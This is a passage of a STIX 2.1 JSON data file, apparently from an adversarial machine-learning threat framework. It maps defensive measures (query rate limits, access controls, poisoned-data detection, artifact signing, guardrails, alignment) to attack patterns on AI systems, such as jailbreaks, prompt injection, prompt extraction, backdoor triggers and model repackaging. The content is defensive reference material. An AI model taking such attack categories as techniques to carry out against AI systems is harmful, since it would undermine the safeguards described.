"attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--d39cdc8b-5767-4da1-8b2b-ee4d51482cfd", "created": "2025-08-12T19:58:34.760289Z", "modified": "2025-08-12T19:58:34.760289Z", "relationship_type": "mitigates", "description": "Limit the volume of API queries in a given period of time to regulate the amount and fidelity of potentially sensitive information an attacker can learn.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--73201125-dfd5-4729-836e-8cc95127401d", "created": "2025-08-12T19:58:34.76036Z", "modified": "2025-08-12T19:58:34.76036Z", "relationship_type": "mitigates", "description": "Limit the volume of API queries in a given period of time to regulate the amount and fidelity of potentially sensitive information an attacker can learn.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--87f11b10-a9c2-486c-85d0-2ae1ca3e9056", "created": "2025-08-12T19:58:34.760429Z", "modified": "2025-08-12T19:58:34.760429Z", "relationship_type": "mitigates", "description": "Limit the volume of API queries in a given period of time to regulate the amount and fidelity of potentially sensitive information an attacker can learn.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--18c6a767-c2c3-4276-97e1-92548d930eda", "created": "2025-08-12T19:58:34.7605Z", "modified": "2025-08-12T19:58:34.7605Z", "relationship_type": "mitigates", "description": "Limit the number of queries users can perform in a given interval to shrink the attack surface for black-box attacks.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--a4d68b59-e5b9-4496-97e3-9438f34727f6", "created": "2025-08-12T19:58:34.760569Z", "modified": "2025-08-12T19:58:34.760569Z", "relationship_type": "mitigates", "description": "Limit the number of queries users can perform in a given interval to prevent a denial of service.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--d37ba04b-06cc-4909-9990-33d1a24b4fc0"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0e68d80c-75c2-45ee-8aa9-40aded848417", "created": "2025-08-12T19:58:34.760638Z", "modified": "2025-08-12T19:58:34.760638Z", "relationship_type": "mitigates", "description": "Limit the number of queries users can perform in a given interval to protect the system from chaff data spam.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--05041d9e-0ece-4f2f-b659-6c6136e34d12"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2055e937-8f32-4a0d-82ff-695f3b43d577", "created": "2025-08-12T19:58:34.760773Z", "modified": "2025-08-12T19:58:34.760773Z", "relationship_type": "mitigates", "description": "Access controls can prevent tampering with ML artifacts and prevent unauthorized copying.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0d4e9c2d-db0d-42c2-8b13-6862553413b5", "created": "2025-08-12T19:58:34.76084Z", "modified": "2025-08-12T19:58:34.76084Z", "relationship_type": "mitigates", "description": "Access controls can prevent tampering with ML artifacts and prevent unauthorized copying.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b1af5e34-1f9b-4dca-8467-d3593bcdc6b7", "created": "2025-08-12T19:58:34.760909Z", "modified": "2025-08-12T19:58:34.760909Z", "relationship_type": "mitigates", "description": "Access controls can prevent tampering with ML artifacts and prevent unauthorized copying.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b5decc8a-38a5-4a9d-8eba-beb915f8c031", "created": "2025-08-12T19:58:34.760978Z", "modified": "2025-08-12T19:58:34.760978Z", "relationship_type": "mitigates", "description": "Access controls can prevent tampering with ML artifacts and prevent unauthorized copying.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--a2de5e8e-2a0a-4d64-81cf-4370131e5922"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5b412a3f-5cdb-41f3-b3a1-d60532387f03", "created": "2025-08-12T19:58:34.761044Z", "modified": "2025-08-12T19:58:34.761044Z", "relationship_type": "mitigates", "description": "Access controls can prevent tampering with ML artifacts and prevent unauthorized copying.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--9b33c6d2-d8e7-45f7-936a-60d1270e5bd9", "created": "2025-08-12T19:58:34.761113Z", "modified": "2025-08-12T19:58:34.761113Z", "relationship_type": "mitigates", "description": "Access controls can prevent exfiltration.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--35d567af-54b2-4b13-ab9e-b77776967091"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--ec82c456-700c-4a3f-9ad3-d670843435bb", "created": "2025-08-12T19:58:34.761185Z", "modified": "2025-08-12T19:58:34.761185Z", "relationship_type": "mitigates", "description": "Access controls can prevent theft of intellectual property.\n", "source_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "target_ref": "attack-pattern--6849f610-5eb5-4b0d-9f88-82b2bbf3fd43"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--8feb6386-a017-4a3c-bf74-869c72e889dd", "created": "2025-08-12T19:58:34.761326Z", "modified": "2025-08-12T19:58:34.761326Z", "relationship_type": "mitigates", "description": "Using multiple different models increases robustness to attack.\n", "source_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "target_ref": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--38c241a9-b45c-4acd-8d74-0fe62cc0e37e", "created": "2025-08-12T19:58:34.76139Z", "modified": "2025-08-12T19:58:34.76139Z", "relationship_type": "mitigates", "description": "Using multiple different models ensures minimal performance loss if security flaw is found in tool for one model or family.\n", "source_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "target_ref": "attack-pattern--8128388c-cca0-4c81-bbe5-d3421ac5d3df"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--fe53b2e4-993c-45a8-9dda-b4bb8380a751", "created": "2025-08-12T19:58:34.761455Z", "modified": "2025-08-12T19:58:34.761455Z", "relationship_type": "mitigates", "description": "Using multiple different models ensures minimal performance loss if security flaw is found in tool for one model or family.\n", "source_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "target_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4eaa9618-b2a8-46fb-a143-f4fbcca90045", "created": "2025-08-12T19:58:34.761522Z", "modified": "2025-08-12T19:58:34.761522Z", "relationship_type": "mitigates", "description": "Using multiple different models increases robustness to attack.\n", "source_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "target_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--c2f35f7c-5d6f-4d94-a616-7deb311e7c7b", "created": "2025-08-12T19:58:34.761588Z", "modified": "2025-08-12T19:58:34.761588Z", "relationship_type": "mitigates", "description": "Use multiple different models to fool adversaries of which type of model is used and how the model used.\n", "source_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "target_ref": "attack-pattern--7da2c306-0c7b-4ca4-80d0-8235cc6cd588"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--69a2b7a7-8d44-43e5-b7ac-5b9bcc4c3183", "created": "2025-08-12T19:58:34.761722Z", "modified": "2025-08-12T19:58:34.761722Z", "relationship_type": "mitigates", "description": "Detect and remove or remediate poisoned data to avoid adversarial model drift or backdoor attacks.\n", "source_ref": "course-of-action--93413c78-9844-4807-82fc-805b991f13a0", "target_ref": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--bbca493f-7350-4218-9120-3ebf01c4ee56", "created": "2025-08-12T19:58:34.76179Z", "modified": "2025-08-12T19:58:34.76179Z", "relationship_type": "mitigates", "description": "Detect modification of data and labels which may cause adversarial model drift or backdoor attacks.\n", "source_ref": "course-of-action--93413c78-9844-4807-82fc-805b991f13a0", "target_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--eb010020-c896-4939-81f8-b04f313ef45f", "created": "2025-08-12T19:58:34.761945Z", "modified": "2025-08-12T19:58:34.761945Z", "relationship_type": "mitigates", "description": "Prevent attackers from leveraging poisoned datasets to launch backdoor attacks against a model.\n", "source_ref": "course-of-action--93413c78-9844-4807-82fc-805b991f13a0", "target_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--f2cd8262-beef-4477-8370-c52f00d4189e", "created": "2025-08-12T19:58:34.762168Z", "modified": "2025-08-12T19:58:34.762168Z", "relationship_type": "mitigates", "description": "Ensure that acquired models do not respond to potential backdoor triggers or adversarial influence.", "source_ref": "course-of-action--74a50fce-ef6e-4575-8535-5c0c07415d0b", "target_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1d8d0eb5-e5c3-4559-a0df-12373e8869f6", "created": "2025-08-12T19:58:34.762247Z", "modified": "2025-08-12T19:58:34.762247Z", "relationship_type": "mitigates", "description": "Ensure that trained models do not respond to potential backdoor triggers or adversarial influence.", "source_ref": "course-of-action--74a50fce-ef6e-4575-8535-5c0c07415d0b", "target_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7335e73b-063c-4506-9f6c-a04b0c86aa29", "created": "2025-08-12T19:58:34.762329Z", "modified": "2025-08-12T19:58:34.762329Z", "relationship_type": "mitigates", "description": "Ensure that acquired models do not respond to potential backdoor triggers or adversarial influence.", "source_ref": "course-of-action--74a50fce-ef6e-4575-8535-5c0c07415d0b", "target_ref": "attack-pattern--a2de5e8e-2a0a-4d64-81cf-4370131e5922"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--03a36302-311a-4a92-83c7-fe8db28ece43", "created": "2025-08-12T19:58:34.762485Z", "modified": "2025-08-12T19:58:34.762485Z", "relationship_type": "mitigates", "description": "Using a variety of sensors can make it more difficult for an attacker with physical access to compromise and produce malicious results.\n", "source_ref": "course-of-action--bf7a7cc1-18bc-4e40-9524-40e582edee1e", "target_ref": "attack-pattern--f5b5647e-6823-4f76-9c33-735da7fb37d3"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2e149a10-9832-4a8f-b989-a5a7838d839b", "created": "2025-08-12T19:58:34.762559Z", "modified": "2025-08-12T19:58:34.762559Z", "relationship_type": "mitigates", "description": "Using a variety of sensors can make it more difficult for an attacker to compromise and produce malicious results.\n", "source_ref": "course-of-action--bf7a7cc1-18bc-4e40-9524-40e582edee1e", "target_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b3335d77-464e-4405-a6bc-f023c78442d2", "created": "2025-08-12T19:58:34.762724Z", "modified": "2025-08-12T19:58:34.762724Z", "relationship_type": "mitigates", "description": "Input restoration adds an extra layer of unknowns and randomness when an adversary evaluates the input-output relationship.\n", "source_ref": "course-of-action--618a733d-5483-40b5-a806-c8193c5e88bc", "target_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--36243687-a383-4eb6-86b8-26e3d15711c4", "created": "2025-08-12T19:58:34.762799Z", "modified": "2025-08-12T19:58:34.762799Z", "relationship_type": "mitigates", "description": "Preprocessing model inputs can prevent malicious data from going through the machine learning pipeline.\n", "source_ref": "course-of-action--618a733d-5483-40b5-a806-c8193c5e88bc", "target_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--11bf9b8c-889f-4e29-bbcb-d73e1cfc80d9", "created": "2025-08-12T19:58:34.762874Z", "modified": "2025-08-12T19:58:34.762874Z", "relationship_type": "mitigates", "description": "Preprocessing model inputs can prevent malicious data from going through the machine learning pipeline.\n", "source_ref": "course-of-action--618a733d-5483-40b5-a806-c8193c5e88bc", "target_ref": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--ee72c350-bd72-417a-b96d-cb78c1338c00", "created": "2025-08-12T19:58:34.763046Z", "modified": "2025-08-12T19:58:34.763046Z", "relationship_type": "mitigates", "description": "Restrict library loading by ML artifacts.\n", "source_ref": "course-of-action--12d79dac-1d29-4988-ab18-013654b9e1cf", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5e38db00-f3eb-4d7b-8416-68a900830a1a", "created": "2025-08-12T19:58:34.763257Z", "modified": "2025-08-12T19:58:34.763257Z", "relationship_type": "mitigates", "description": "Protect machine learning artifacts with encryption.\n", "source_ref": "course-of-action--5bc32c96-9f7e-4fbe-b209-9129cc94e598", "target_ref": "attack-pattern--a5d1adea-11f5-4ed0-94f3-78d19b40c8fd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--9f0a71b2-7c9c-4baa-8fdc-0d6c12c50955", "created": "2025-08-12T19:58:34.763345Z", "modified": "2025-08-12T19:58:34.763345Z", "relationship_type": "mitigates", "description": "Protect machine learning artifacts with encryption.\n", "source_ref": "course-of-action--5bc32c96-9f7e-4fbe-b209-9129cc94e598", "target_ref": "attack-pattern--6849f610-5eb5-4b0d-9f88-82b2bbf3fd43"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--32f5970a-5b7a-4e58-a41f-fa4ad9de6a20", "created": "2025-08-12T19:58:34.763418Z", "modified": "2025-08-12T19:58:34.763418Z", "relationship_type": "mitigates", "description": "Protect machine learning artifacts from adversaries who gather private information to target and improve attacks.\n", "source_ref": "course-of-action--5bc32c96-9f7e-4fbe-b209-9129cc94e598", "target_ref": "attack-pattern--b03e5d58-e4ab-4377-8fea-2a506d3a13ed"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--68c02d5e-e692-4f6d-942c-1fd2944923c4", "created": "2025-08-12T19:58:34.763569Z", "modified": "2025-08-12T19:58:34.763569Z", "relationship_type": "mitigates", "description": "Prevent execution of ML artifacts that are not properly signed.\n", "source_ref": "course-of-action--e1c12848-fd8f-4270-a550-4b0595b16546", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2e875b37-a839-4ad3-8dd4-76dafa191e8e", "created": "2025-08-12T19:58:34.763639Z", "modified": "2025-08-12T19:58:34.763639Z", "relationship_type": "mitigates", "description": "Enforce properly signed drivers and ML software frameworks.\n", "source_ref": "course-of-action--e1c12848-fd8f-4270-a550-4b0595b16546", "target_ref": "attack-pattern--8128388c-cca0-4c81-bbe5-d3421ac5d3df"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5878e34c-c356-42c1-b5b2-a8be56349c54", "created": "2025-08-12T19:58:34.76371Z", "modified": "2025-08-12T19:58:34.76371Z", "relationship_type": "mitigates", "description": "Enforce properly signed model files.\n", "source_ref": "course-of-action--e1c12848-fd8f-4270-a550-4b0595b16546", "target_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--460036be-9bec-4af7-95e0-7528f69b3f75", "created": "2025-08-12T19:58:34.763855Z", "modified": "2025-08-12T19:58:34.763855Z", "relationship_type": "mitigates", "description": "Determine validity of published data in order to avoid using poisoned data that introduces vulnerabilities.\n", "source_ref": "course-of-action--8ed6c38c-4715-4764-bf91-2ecb4c0f6ec4", "target_ref": "attack-pattern--0d2e410d-cc24-42c3-a26b-86059cb9d976"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--39658aff-9524-43fd-866a-ce7e981bbfd0", "created": "2025-08-12T19:58:34.763929Z", "modified": "2025-08-12T19:58:34.763929Z", "relationship_type": "mitigates", "description": "Introduce proper checking of signatures to ensure that unsafe ML artifacts will not be executed in the system.\n", "source_ref": "course-of-action--8ed6c38c-4715-4764-bf91-2ecb4c0f6ec4", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7170cc81-b878-4afc-ad62-3c142669db3a", "created": "2025-08-12T19:58:34.763996Z", "modified": "2025-08-12T19:58:34.763996Z", "relationship_type": "mitigates", "description": "Introduce proper checking of signatures to ensure that unsafe ML artifacts will not be introduced to the system.\n", "source_ref": "course-of-action--8ed6c38c-4715-4764-bf91-2ecb4c0f6ec4", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5b9038cb-98d6-4257-b945-32e09ea41fc8", "created": "2025-08-12T19:58:34.764143Z", "modified": "2025-08-12T19:58:34.764143Z", "relationship_type": "mitigates", "description": "Prevent an attacker from introducing adversarial data into the system.\n", "source_ref": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "target_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--3a0e82fa-3695-4994-bdd8-dec7eec41741", "created": "2025-08-12T19:58:34.764219Z", "modified": "2025-08-12T19:58:34.764219Z", "relationship_type": "mitigates", "description": "Monitor queries and query patterns to the target model, block access if suspicious queries are detected.\n", "source_ref": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "target_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--51462767-e55b-43b2-9e8f-e70268c8805a", "created": "2025-08-12T19:58:34.764293Z", "modified": "2025-08-12T19:58:34.764293Z", "relationship_type": "mitigates", "description": "Assess queries before inference call or enforce timeout policy for queries which consume excessive resources.\n", "source_ref": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "target_ref": "attack-pattern--d37ba04b-06cc-4909-9990-33d1a24b4fc0"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--387c87ac-399d-4c5b-adf7-e2426a2867c4", "created": "2025-08-12T19:58:34.764366Z", "modified": "2025-08-12T19:58:34.764366Z", "relationship_type": "mitigates", "description": "Incorporate adversarial input detection into the pipeline before inputs reach the model.\n", "source_ref": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "target_ref": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5562b889-b416-475e-8c53-43a23107d58e", "created": "2025-08-12T19:58:34.764514Z", "modified": "2025-08-12T19:58:34.764514Z", "relationship_type": "mitigates", "description": "Scan ML artifacts for vulnerabilities before execution.\n", "source_ref": "course-of-action--e12c9cc1-de46-4b0c-8204-c9dc67ca8a39", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--254b15af-f131-4ffe-9af4-6d4629ac93ce", "created": "2025-08-12T19:58:34.764662Z", "modified": "2025-08-12T19:58:34.764662Z", "relationship_type": "mitigates", "description": "Not distributing the model in software to edge devices, can limit an adversary's ability to gain full access to the model.\n", "source_ref": "course-of-action--4601ffbb-044c-4964-9643-c09eb4cd2263", "target_ref": "attack-pattern--65a7290b-006b-4961-b51f-9aa0b132fab3"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--8f682d35-b5dd-4781-85f3-c37c9be1da89", "created": "2025-08-12T19:58:34.764742Z", "modified": "2025-08-12T19:58:34.764742Z", "relationship_type": "mitigates", "description": "With full access to the model, an adversary could perform white-box attacks.\n", "source_ref": "course-of-action--4601ffbb-044c-4964-9643-c09eb4cd2263", "target_ref": "attack-pattern--5e379496-6393-41d5-b392-ba96edbe4f86"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--f52a85ef-3d27-4f77-8653-4465dac9e96f", "created": "2025-08-12T19:58:34.764812Z", "modified": "2025-08-12T19:58:34.764812Z", "relationship_type": "mitigates", "description": "An adversary could repackage the application with a malicious version of the model.\n", "source_ref": "course-of-action--4601ffbb-044c-4964-9643-c09eb4cd2263", "target_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--e05e02d0-30f3-40dc-8e89-8be2e90c329d", "created": "2025-08-12T19:58:34.764959Z", "modified": "2025-08-12T19:58:34.764959Z", "relationship_type": "mitigates", "description": "Training users to be able to identify attempts at manipulation will make them less susceptible to performing techniques that cause the execution of malicious code.\n", "source_ref": "course-of-action--acac05f4-091b-4f75-92b1-8c9cc5673601", "target_ref": "attack-pattern--36e33591-e21d-43cd-aa32-a2ad2c9e8d1e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--35e101fc-0f07-4a87-bad4-be1de68be40b", "created": "2025-08-12T19:58:34.765084Z", "modified": "2025-08-12T19:58:34.765084Z", "relationship_type": "mitigates", "description": "Train users to identify attempts of manipulation to prevent them from running unsafe code which when executed could develop unsafe artifacts. These artifacts may have a detrimental effect on the system.\n", "source_ref": "course-of-action--acac05f4-091b-4f75-92b1-8c9cc5673601", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--327cfc1a-a443-4df9-a5b8-7924782e2ee6", "created": "2025-08-12T19:58:34.765284Z", "modified": "2025-08-12T19:58:34.765284Z", "relationship_type": "mitigates", "description": "Adversaries can use unrestricted API access to gain information about a production system, stage attacks, and introduce malicious data to the system.\n", "source_ref": "course-of-action--10c73291-d9ac-45cd-be74-5efde9361756", "target_ref": "attack-pattern--62f636dd-9f62-4f22-adc2-471c3f061e9d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--db17c1a6-49b5-42bb-acbc-1e78f952e189", "created": "2025-08-12T19:58:34.765364Z", "modified": "2025-08-12T19:58:34.765364Z", "relationship_type": "mitigates", "description": "Adversaries can use unrestricted API access to build a proxy training dataset and reveal private information.\n", "source_ref": "course-of-action--10c73291-d9ac-45cd-be74-5efde9361756", "target_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--54ceb612-ad88-404d-99eb-9acc5f6eb0df", "created": "2025-08-12T19:58:34.76559Z", "modified": "2025-08-12T19:58:34.76559Z", "relationship_type": "mitigates", "description": "Guardrails can prevent harmful inputs that can lead to a jailbreak.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--fe1b057b-ad2f-4bfc-90f1-a456e17dee9d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--556f2e1b-1d59-4708-b207-7ea2fbeebf36", "created": "2025-08-12T19:58:34.76572Z", "modified": "2025-08-12T19:58:34.76572Z", "relationship_type": "mitigates", "description": "Guardrails can prevent harmful inputs that can lead to meta prompt extraction.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--5c7dee7b-62ca-44a4-99ca-2412459d0124"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--ac64f84f-f7d3-495a-a350-edbfea03c765", "created": "2025-08-12T19:58:34.765813Z", "modified": "2025-08-12T19:58:34.765813Z", "relationship_type": "mitigates", "description": "Guardrails can prevent harmful inputs that can lead to plugin compromise, and they can detect PII in model outputs.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--8ebcea3c-27d4-49d3-aee8-400a682e3bab"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--f05ae726-1798-4751-af09-5f551201eaa9", "created": "2025-08-12T19:58:34.765901Z", "modified": "2025-08-12T19:58:34.765901Z", "relationship_type": "mitigates", "description": "Guardrails can prevent harmful inputs that can lead to prompt injection.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--16ae7aa9-300d-4227-9f1c-97f189a8f66d", "created": "2025-08-12T19:58:34.765986Z", "modified": "2025-08-12T19:58:34.765986Z", "relationship_type": "mitigates", "description": "Guardrails can detect sensitive data and PII in model outputs.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--2aca6880-e878-4bc2-b100-e80ce47fb4b6"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0b0a6f1f-02fe-47c7-ba67-8100de2f281b", "created": "2025-08-12T19:58:34.766055Z", "modified": "2025-08-12T19:58:34.766055Z", "relationship_type": "mitigates", "description": "Guardrails can detect harmful code in model outputs.", "source_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7d72f292-fb51-4464-b5dc-17bbda073a6f", "created": "2025-08-12T19:58:34.766223Z", "modified": "2025-08-12T19:58:34.766223Z", "relationship_type": "mitigates", "description": "Model guidelines can instruct the model to refuse a response to unsafe inputs.", "source_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "target_ref": "attack-pattern--fe1b057b-ad2f-4bfc-90f1-a456e17dee9d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--fa91b370-1bb5-4840-9be7-0edb39c0ca1f", "created": "2025-08-12T19:58:34.766307Z", "modified": "2025-08-12T19:58:34.766307Z", "relationship_type": "mitigates", "description": "Model guidelines can instruct the model to refuse a response to unsafe inputs.", "source_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "target_ref": "attack-pattern--5c7dee7b-62ca-44a4-99ca-2412459d0124"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--10dcb87a-85d9-4978-9986-7c78003020c8", "created": "2025-08-12T19:58:34.766387Z", "modified": "2025-08-12T19:58:34.766387Z", "relationship_type": "mitigates", "description": "Model guidelines can instruct the model to refuse a response to unsafe inputs.", "source_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "target_ref": "attack-pattern--8ebcea3c-27d4-49d3-aee8-400a682e3bab"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--138cf94d-a513-414d-9f9b-3d140f0c44b1", "created": "2025-08-12T19:58:34.766465Z", "modified": "2025-08-12T19:58:34.766465Z", "relationship_type": "mitigates", "description": "Model guidelines can instruct the model to refuse a response to unsafe inputs.", "source_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5a6fb9a6-895c-4134-a02b-1c4bd54d1088", "created": "2025-08-12T19:58:34.766544Z", "modified": "2025-08-12T19:58:34.766544Z", "relationship_type": "mitigates", "description": "Model guidelines can instruct the model to refuse a response to unsafe inputs.", "source_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "target_ref": "attack-pattern--2aca6880-e878-4bc2-b100-e80ce47fb4b6"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7db7d021-6f55-478a-be12-ba38b569aa0a", "created": "2025-08-12T19:58:34.766704Z", "modified": "2025-08-12T19:58:34.766704Z", "relationship_type": "mitigates", "description": "Model alignment can improve the parametric safety of a model by guiding it away from unsafe prompts and responses.", "source_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "target_ref": "attack-pattern--fe1b057b-ad2f-4bfc-90f1-a456e17dee9d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--c747b35b-6968-4be5-b358-49356265d8a7", "created": "2025-08-12T19:58:34.766785Z", "modified": "2025-08-12T19:58:34.766785Z", "relationship_type": "mitigates", "description": "Model alignment can improve the parametric safety of a model by guiding it away from unsafe prompts and responses.", "source_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "target_ref": "attack-pattern--5c7dee7b-62ca-44a4-99ca-2412459d0124"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2becd166-9d3a-469b-956a-3656407ba2c5", "created": "2025-08-12T19:58:34.766865Z", "modified": "2025-08-12T19:58:34.766865Z", "relationship_type": "mitigates", "description": "Model alignment can improve the parametric safety of a model by 